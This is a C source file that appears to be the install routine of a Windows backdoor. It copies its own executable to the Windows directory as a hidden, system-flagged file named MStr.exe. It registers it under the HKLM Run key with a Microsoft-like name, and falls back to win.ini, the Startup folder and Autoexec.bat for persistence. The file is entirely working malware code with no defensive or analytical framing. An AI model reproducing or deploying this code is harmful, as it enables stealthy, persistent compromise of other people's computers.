#include <windows.h>

void Install(void);

void Install(void)
{
	char	BackdoorPath[MAX_PATH];
	char	WinDir[MAX_PATH];
	char	WinDir2[MAX_PATH];
	char	InstallName[] = "\\MStr.exe";

	HKEY	RegHandle;

	HANDLE	WinIniHandle;
	DWORD	BytesWritten;
	char	WinIniRun[] = "\r\nrun=";

	char	StartupFolder[MAX_PATH];
	DWORD	StartupFolderSize = sizeof(StartupFolder);

	HANDLE	AutoexecHandle;
	char	AutoexecRun[] = "\r\n@echo off\r\n";

	if(GetModuleFileName(0, BackdoorPath, sizeof(BackdoorPath)) != 0)
	{
		if(GetWindowsDirectory(WinDir, sizeof(WinDir)) != 0)
		{
			lstrcat(WinDir, InstallName);
			DeleteFile(WinDir); //delete previous versions

			if(CopyFile(BackdoorPath, WinDir, FALSE) != 0)
			{
				SetFileAttributes(WinDir, FILE_ATTRIBUTE_HIDDEN + FILE_ATTRIBUTE_SYSTEM);

				if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &RegHandle) == ERROR_SUCCESS)
				{
					RegSetValueEx(RegHandle, "MS.trix", 0, REG_SZ, (unsigned char *)&WinDir, lstrlen(WinDir));
					RegCloseKey(RegHandle);
					return;
				}
				else //cant write to registry but to windows directory
				{
					GetWindowsDirectory(WinDir2, sizeof(WinDir2));
					lstrcat(WinDir2, "\\win.ini");

					WinIniHandle = CreateFile(WinDir2, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

					if(WinIniHandle != 0)
					{
						SetFilePointer(WinIniHandle, 0, 0, FILE_END);
						WriteFile(WinIniHandle, WinIniRun, lstrlen(WinIniRun), &BytesWritten, 0);
						WriteFile(WinIniHandle, WinDir, lstrlen(WinDir), &BytesWritten, 0);
						CloseHandle(WinIniHandle);
						return;
					}
				}
		
			}
			else //cant write to windows directory
			{
				RegOpenKeyEx(HKEY_USERS, ".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 0, KEY_QUERY_VALUE, &RegHandle);
				RegQueryValueEx(RegHandle, "Startup", 0, 0, (BYTE *)&StartupFolder, &StartupFolderSize);
				RegCloseKey(RegHandle);

				lstrcat(StartupFolder, InstallName);
				DeleteFile(StartupFolder);

				if(CopyFile(BackdoorPath, StartupFolder, FALSE) != 0)
				{
					SetFileAttributes(StartupFolder, FILE_ATTRIBUTE_HIDDEN + FILE_ATTRIBUTE_SYSTEM);
					return;
				}
				else //can not write to autostart folder
				{
					AutoexecHandle = CreateFile("C:\\Autoexec.bat", GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
					SetFilePointer(AutoexecHandle, 0, 0, FILE_END);
					WriteFile(AutoexecHandle, AutoexecRun, lstrlen(AutoexecRun), &BytesWritten, 0);
					WriteFile(AutoexecHandle, WinDir, lstrlen(WinDir), &BytesWritten, 0);
					CloseHandle(AutoexecHandle);
				}
			}
		}
	}

	return;
}
